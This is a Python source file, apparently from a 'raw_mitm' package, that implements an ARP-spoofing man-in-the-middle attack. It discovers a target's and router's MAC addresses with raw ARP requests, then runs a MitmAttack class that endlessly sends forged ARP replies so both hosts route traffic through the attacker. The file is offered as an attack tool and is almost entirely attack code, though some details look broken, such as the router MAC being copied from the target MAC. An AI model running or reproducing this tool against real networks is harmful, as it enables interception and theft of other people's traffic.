from raw_mitm.logger import Logger as logger
from raw_mitm.models import *

from threading import Thread
from typing import Union
from enum import Enum, auto

import socket
import struct
import binascii
import sys

class Host(Enum):
    HOSTMACHINE = auto()
    TARGET = auto()
    ROUTER = auto()

class MacRetriever:
    def __init__(self, args: MacDiscoverArgs):
        self.sock = None
        self.receiver = None

        self.router_ip = socket.inet_aton(args.router_ip)
        self.target_ip = socket.inet_aton(args.target_ip)
        self.your_ip = socket.inet_aton(args.your_ip)
        self.your_mac = binascii.unhexlify(args.your_mac.replace(":", ""))
        self.interface = args.interface

        self.protocol = 0x0806

        self.htype = 1
        self.ptype = 0x0800
        self.hlen = 6
        self.plen = 4
        self.operation = 1

        self._router_mac = None
        self._target_mac = None

    @property
    def router_mac(self) -> Union[bytes, None]:
        return self._router_mac

    @property
    def target_mac(self) -> Union[bytes, None]:
        return self._target_mac

    def create_ethr_header(self, ether: EtherHeader) -> bytes:
        return struct.pack(
            "!6s6sH", 
            ether.dest_mac, 
            ether.source_mac, 
            ether.protocol
        )

    def create_arp_header(self, arp: ArpHeader) -> bytes:
        if not isinstance(arp.sender_ip, bytes):
            arp.sender_ip = socket.inet_aton(arp.sender_ip)
        if not isinstance(arp.dest_ip, bytes):
            arp.dest_ip = socket.inet_aton(arp.dest_ip)

        return struct.pack(
            "!HHBBH6s4s6s4s",
            arp.htype,
            arp.ptype,
            arp.hlen,
            arp.plen,
            arp.operation,
            arp.sender_mac,
            arp.sender_ip,
            arp.dest_mac,
            arp.dest_ip
        )

    def _receive_mac(self, host: Host) -> None:
        packets = []
        while True:
            _, data = self.receiver.recvfrom(65535)
            if len(packets) == 2:
                print(packets)
                if host == Host.ROUTER:
                    self._router_mac = packets[-1][-1]
                elif host == Host.TARGET:
                    self._target_mac = packets[-1][-1]
                break

            packets.append(data)

    def request_mac(self, host: Host, ethr_header: EtherHeader, arp_header: ArpHeader) -> None:  
        ethr_header = self.create_ethr_header(ethr_header)
        arp_header = self.create_arp_header(arp_header)
        receive_thread = Thread(target=self._receive_mac, args=(host,))
        packet = ethr_header + arp_header
        receive_thread.start()
        self.sock.send(packet)

    def _setup_socket(self):
        self.receiver = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003)
        )

        self.sock = socket.socket(
            socket.PF_PACKET,
            socket.SOCK_RAW, 
            socket.htons(0x0800)
        )
        self.sock.bind((self.interface, socket.htons(0x0800)))

    def _clean_attrs(self):
        keys = self.__dict__.keys()
        for key in keys:
            if key[0] == "_":
                continue
            delattr(self, key)

    def obtain(self):
        self._setup_socket()
        self.request_mac(
            Host.TARGET,
            EtherHeader(
                dest_mac=binascii.unhexlify(
                    ":".join(["ff" for i in range(6)])
                ),
                source_mac=self.your_mac,
                protocol=self.protocol
            ),
            ArpHeader(
                htype=self.htype,
                ptype=self.ptype,
                hlen=self.hlen,
                plen=self.plen,
                operation=self.operation,
                sender_mac=self.your_mac,
                sender_ip=self.your_ip,
                dest_mac=binascii.unhexlify(
                    ":".join(["00" for i in range(6)])
                ),
                dest_ip=self.target_ip
            )
        )

        self.request_mac(
            Host.ROUTER,
            EtherHeader(
                dest_mac=binascii.unhexlify(
                    ":".join(["ff" for i in range(6)])
                ),
                source_mac=self._target_mac,
                protocol=self.protocol
            ),
            ArpHeader(
                htype=self.htype,
                ptype=self.ptype,
                hlen=self.hlen,
                plen=self.plen,
                operation=self.operation,
                sender_mac=self._target_mac,
                sender_ip=self.target_ip,
                dest_mac=binascii.unhexlify(
                    ":".join(["00" for i in range(6)])
                ),
                dest_ip=self.router_ip
            )
        )

        self.sock.close()
        self._clean_attrs()

class MitmAttack:
    def __init__(self, args: MitmArgs):
        self.sock = None
        self.router_ip = socket.inet_aton(args.router_ip)
        self.target_ip = socket.inet_aton(args.target_ip)
        self.your_mac = args.your_mac.encode("utf-8")
        self.target_mac = args.target_mac.encode("utf-8")
        self.router_mac = args.target_mac.encode("utf-8")
        self.interface = args.interface.encode("utf-8")

        self.protocol = 0x0806

        self.htype = 1
        self.ptype = 0x0800
        self.hlen = 6
        self.plen = 4
        self.operation = 2

    def create_ethr_header(self, ether: EtherHeader) -> bytes:
        return struct.pack(
            "!6s6sH", 
            ether.dest_mac, 
            ether.source_mac, 
            ether.protocol
        )

    def create_arp_header(self, arp: ArpHeader) -> bytes:
        if not isinstance(arp.sender_ip, bytes):
            arp.sender_ip = socket.inet_aton(arp.sender_ip)
        if not isinstance(arp.dest_ip, bytes):
            arp.dest_ip = socket.inet_aton(arp.dest_ip)

        return struct.pack(
            "!HHBBH6s4s6s4s",
            arp.htype,
            arp.ptype,
            arp.hlen,
            arp.plen,
            arp.operation,
            arp.sender_mac,
            arp.sender_ip,
            arp.dest_mac,
            arp.dest_ip
        )

    def spoof_host(self, eth: EtherHeader, arp: ArpHeader):
        eth_hdr = self.create_ethr_header(eth)
        arp_hdr = self.create_arp_header(arp)
        packet = eth_hdr + arp_hdr

        logger.custom(f"Spoofing '{arp.sender_ip} ({arp.sender_mac})' ...", line_break=True)
        while True:
            try:
                self.sock.send(packet)
            except Exception as ex:
                raise ValueError(ex)
            except KeyboardInterrupt:
                break

    def setup_socket(self):
        self.sock = socket.socket(
            socket.PF_PACKET,
            socket.SOCK_RAW, 
            socket.htons(0x0800)
        )
        self.sock.bind((self.interface, socket.htons(0x0800)))
        logger.info(f"Connection successfuly stablished with the '{self.interface}' interface!")

    def run(self):
        self.setup_socket()

        try:
            thread_router = Thread(
                target=self.spoof_host,
                args=(
                    EtherHeader(
                        dest_mac=self.router_mac,
                        source_mac=self.your_mac,
                        protocol=self.protocol
                    ),

                    ArpHeader(
                        htype=self.htype,
                        ptype=self.ptype,
                        hlen=self.hlen,
                        plen=self.plen,
                        operation=self.operation,
                        sender_mac=self.your_mac,
                        sender_ip=self.target_ip,
                        dest_mac=self.router_mac,
                        dest_ip=self.router_ip
                    ),
                )
            )

            thread_target = Thread(
                target=self.spoof_host,
                args=(
                    EtherHeader(
                        dest_mac=self.target_mac,
                        source_mac=self.your_mac,
                        protocol=self.protocol
                    ),

                    ArpHeader(
                        htype=self.htype,
                        ptype=self.ptype,
                        hlen=self.hlen,
                        plen=self.plen,
                        operation=self.operation,
                        sender_mac=self.your_mac,
                        sender_ip=self.router_ip,
                        dest_mac=self.target_mac,
                        dest_ip=self.target_ip
                    ),
                )
            )

            thread_router.run()
            thread_target.run()

        except KeyboardInterrupt:
            self.sock.close()
            sys.exit(1)

        except Exception as ex:
            raise ValueError(ex)
